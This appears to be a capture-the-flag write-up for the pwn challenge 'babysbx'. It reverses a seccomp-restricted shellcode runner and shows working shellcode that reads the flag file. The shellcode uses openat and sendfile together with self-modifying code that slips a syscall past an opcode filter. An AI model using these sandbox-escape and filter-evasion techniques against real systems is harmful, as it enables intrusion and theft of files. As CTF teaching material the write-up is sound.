# babysbx
```
2 solves / 496 points
Author: TheFlash2k
Yet another sandbox escape. However, is it really that easy?
```
*NOTE:* I didn't finish this challenge during the ctf, but i did find the exploit and vuln :)
___
# Starting the challenge
We get the files `babysbx`, `flag.txt` and a `Dockerfile`.
I tried running `babysbx` and it asked me to proved it with shellcode
```bash
$ ./babysbx
Give me your shellcode: 
```

# Looking in IDA
I opened the `babysbx` executable in IDA and looked at the `main` function
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *s; // [rsp+18h] [rbp-8h]

  s = mmap((void *)0xDEAD0000LL, 0x1000uLL, 7, 33, -1, 0LL);
  memset(s, 0, 0x1000uLL);
  printf("Give me your shellcode: ");
  read(0, s, 0x1000uLL);
  puts("==> Validating shellcode so it doesn't contain any invalid instruction.");
  if ( !(unsigned int)validate(s, 0x1000) )
  {
    puts("Nope. Can't run this shellcode.");
    exit(1);
  }
  puts("Shellcode looks clean. Invoking..");
  init_sbx();
  init_reg();
  ((void (__fastcall *)(const char *))s)("Shellcode looks clean. Invoking..");
  return 0;
}
```

Let's check what the flags to mmap mean
```bash
$ strace ./babysbx
...
mmap(0xdead0000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0xdead0000

```
It seems like we map an area on a "fixed" location.

we later copy our inputted sellcode to that area, call the `validate` function on it and after that we call `init_sbx`, `init_reg` and execute our "validated" shellcode.

let's look at `init_sbx` and `init_reg`.
### init_reg
![](_attachments/Pasted%20image%2020240503191055.png)
It seems lke this function just clears out our registers, probably to make it hader for us to execut our shellcode

### init_sbx
IDA seems to struggle with disassembling it, but we can see enough to understand that it just sets up some seccomp rules.
```c
__int64 init_sbx()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  if ( !v1 )
    exit(0);
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  seccomp_rule_add();
  return seccomp_load(v1);
}
```

# Exploiting
I broke down this challenge for 2 simple steps, first being bypassing the seccomp rules and the other being bypassing the `validate` function.

## Bypassing seccomp
I found this amazing document online [Guid of Seccomp in CTF](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html) which talks about how to bypass seccomp in ctf challenges.

Using `seccomp-tools` I took a look at all the seccomp rules
```bash
$ seccomp-tools dump ./babysbx
Give me your shellcode:
==> Validating shellcode so it doesn't contain any invalid instruction.
Shellcode looks clean. Invoking..
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
 0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
 0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
 0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
 0008: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0014
 0009: 0x15 0x04 0x00 0x000000bb  if (A == readahead) goto 0014
 0010: 0x15 0x03 0x00 0x0000010b  if (A == readlinkat) goto 0014
 0011: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0014
 0012: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
```

And I quickly saw that I could use both `openat` to open the file and `sendfile`  to open and read the file.

I patched the binary to bypass the `validate`  function and tried running it with this shellcode
```c
#include <sys/uio.h>

#define NULL            ((void *)0)
#define STDOUT          (1)
#define SYS_sendfile    (0x28)
#define SYS_openat      (0x101)

void *syscall(int syscall_number,
              void *arg1,
              void *arg2,
              void *arg3,
              void *arg4,
              void *arg5,
              void *arg6);
asm(
".global syscall\n"
"syscall:\n"
"movq rax, rdi\n"
"movq rdi, rsi\n"
"movq rsi, rdx\n"
"movq rdx, rcx\n"
"movq r10, r8\n"
"movq r8, r9\n"
"movq r9, [rsp + 32]\n"
"syscall\n"
"ret");

__attribute__((section(".entry"))) int main(void)
{
    int f = syscall(SYS_openat, NULL, "/home/tomer/Desktop/Airoverflow/pwn/babysbx/flag.txt", NULL, NULL, NULL, NULL );
    syscall(SYS_sendfile, STDOUT, f, 0, 40, NULL, NULL);
}
```

and it worked!
```bash
$ python exploit.py
[+] Starting local process './patched_babysbx': pid 7869
[*] Switching to interactive mode
[*] Process './patched_babysbx' stopped with exit code 0 (pid 7869)
Give me your shellcode: ==> Validating shellcode so it doesn't contain any invalid instruction.
Invalid instruction(s) found!
Shellcode looks clean. Invoking..
CTF{F4k3_fl4g_f0r_t3st1ng}
```


## Passing the validate function
We can take a look at the `validate` function in IDA.
```c
__int64 __fastcall validate(void *shellcode, int length)
{
  unsigned __int64 v2; // rax
  void *v3; // rsp
  _BYTE validation_staging_area[4]; // [rsp+8h] [rbp-C0h] BYREF
  int v6; // [rsp+Ch] [rbp-BCh]
  _BYTE *shellcode_copy; // [rsp+10h] [rbp-B8h]
  __int16 instruction_length; // [rsp+26h] [rbp-A2h]
  unsigned int k; // [rsp+28h] [rbp-A0h]
  int j; // [rsp+2Ch] [rbp-9Ch]
  int validation_key_index; // [rsp+30h] [rbp-98h]
  int i; // [rsp+34h] [rbp-94h]
  __int64 instruction_length_1; // [rsp+38h] [rbp-90h]
  void *validation_staging_area_1; // [rsp+40h] [rbp-88h]
  void *validation_keys___[4]; // [rsp+48h] [rbp-80h]
  char invalid_chars[29]; // [rsp+68h] [rbp-60h] OVERLAPPED
  unsigned __int64 canary; // [rsp+90h] [rbp-38h]

  shellcode_copy = shellcode;
  v6 = length;
  canary = __readfsqword(0x28u);
  instruction_length = 2;
  for ( i = 0; i <= 4094; ++i )
  {
    validation_keys___[0] = &int80;
    validation_keys___[1] = &syscall;
    validation_keys___[2] = &sysenter;
    instruction_length_1 = instruction_length + 1 - 1LL;
    v2 = 16 * ((instruction_length + 1 + 15LL) / 0x10uLL);
    while ( validation_staging_area != &validation_staging_area[-(v2 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v3 = alloca(v2 & 0xFFF);
    if ( (v2 & 0xFFF) != 0 )
      *(_QWORD *)&validation_staging_area[(v2 & 0xFFF) - 8] = *(_QWORD *)&validation_staging_area[(v2 & 0xFFF) - 8];
    validation_staging_area_1 = validation_staging_area;
    memset(validation_staging_area, 0, instruction_length + 1);
    memcpy(validation_staging_area_1, &shellcode_copy[i], instruction_length);
    for ( validation_key_index = 0; validation_key_index <= 2; ++validation_key_index )
    {
      if ( !memcmp(validation_staging_area_1, validation_keys___[validation_key_index], instruction_length) )
      {
LABEL_8:
        puts("Invalid instruction(s) found!");
        return 1LL;
      }
    }
  }
  *(_QWORD *)invalid_chars = 0xA1A08E8C8B8A8988LL;
  *(_QWORD *)&invalid_chars[8] = 0xB3B2B1B0A5A4A3A2LL;
  *(_QWORD *)&invalid_chars[16] = 0xBBBAB9B8B7B6B5B4LL;
  *(_DWORD *)&invalid_chars[24] = 0xBFBEBDBC;
  *(_WORD *)&invalid_chars[28] = -14394;
  for ( j = 0; j < v6; ++j )
  {
    for ( k = 0; k <= 0x1D; ++k )
    {
      if ( shellcode_copy[j] == invalid_chars[k] )
        goto LABEL_8;
    }
  }
  return 0LL;
}
```

As we can see it looks pretty annoying, but that's because the code is written weirdly/ IDA struggles with decompiling it.
This function validates two things, the first being that the opcodes for `int80` or `syscall` or `sysenter` don't exist.
After doing that, it checks all the opcodes in the shellcode aren't inside the `invalid_chars` list.

Looking at those opcodes we can see that it disables `mov` instructions.

Luckily for us, we can still use instructions such as `add`, `xor`, `push`, `pop` and `or`  to move values into our registers!

Another trick we could use is using 
```
int BYTE PTR [rip]
.word 0x050e
```
instead of `syscall`.

This uses the fact that the shellcode's location is writeable, and just increases the value of `0x050e` to `0x050f` (which is the `syscall` instruction) in runtime to pass the validation.

so now we can write our shellcode!
___
to find the location of flag I ran the docker using `sudo docker run --rm --privileged -p 0.0.0.0:8000:8000 -it babysbx /bin/sh` and I found it at `/truly-the-flag`.
___

```python
# instruction to build `syscall` at runtime:
syscall = """
    inc BYTE PTR [rip]
    .word 0x050e
"""

sc = asm(f"""

    /* load /truly-the-flag into rsi */
    or rbx, flag[rip]
    or rcx, flag+8[rip]
    push rcx
    push rbx
    lea rsi, [rsp]

    /* openat */
    xor rax, rax
    add rax, 0x101
    {syscall}

    /* sendfile */
    push 0x01
    pop rdi
    push rax
    pop rsi
    add r10, 0x1000
    xor rax, rax
    add rax, 0x28
    {syscall}

flag:
    .string "/truly-the-flag"
""")
```
*SHELLCODE provided by TheFlash2k*

and we solved the challenge!